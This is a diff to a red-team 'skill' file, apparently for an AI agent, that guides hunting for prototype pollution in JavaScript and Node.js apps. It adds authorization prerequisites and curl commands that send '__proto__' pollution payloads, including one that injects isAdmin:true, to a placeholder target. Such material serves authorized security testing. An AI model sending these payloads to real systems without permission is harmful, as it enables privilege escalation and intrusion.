@@ -1,17 +1,18 @@
 ---
 name: hunt-prototype-pollution
 description: Hunt client-side and server-side prototype pollution for XSS, auth bypass, and RCE.
-category: redteam
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
 compatibility: Requires curl, python3
-tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
-related_skills:
-  - hunt-nodejs
-  - hunt-xss
-  - hunt-api-misconfig
+metadata:
+  tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
+  category: redteam
+  related_skills:
+    - hunt-frameworks
+    - hunt-xss
+    - hunt-api-misconfig
 ---
 
 # Prototype Pollution Hunting
@@ -25,6 +26,25 @@ Hunt for prototype pollution vulnerabilities where user-supplied properties merg
 - Lodash `_.merge()`, `_.defaultsDeep()`, `_.set()` receiving request body/query params.
 - Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
 - Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# client-side: pollute via query param
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?__proto__[polluted]=true"
+
+# server-side: pollute via JSON body
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/config" \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"isAdmin":true}}'
+```
 
 ## Quick Detection
 
@@ -150,8 +170,10 @@ curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/prof
 3. For XSS: verify the polluted property reaches `innerHTML`, `eval`, `document.write`, or a script `src` attribute.
 4. Document the exact merge/copy function and the polluted property chain.
 
+---
+
 ## Related Skills
 
-- **`hunt-nodejs`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
+- **`hunt-frameworks`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
 - **`hunt-xss`** — DOM XSS often exploitable through client-side prototype pollution.
 - **`hunt-api-misconfig`** — Object merge on request bodies without `hasOwnProperty` checks.
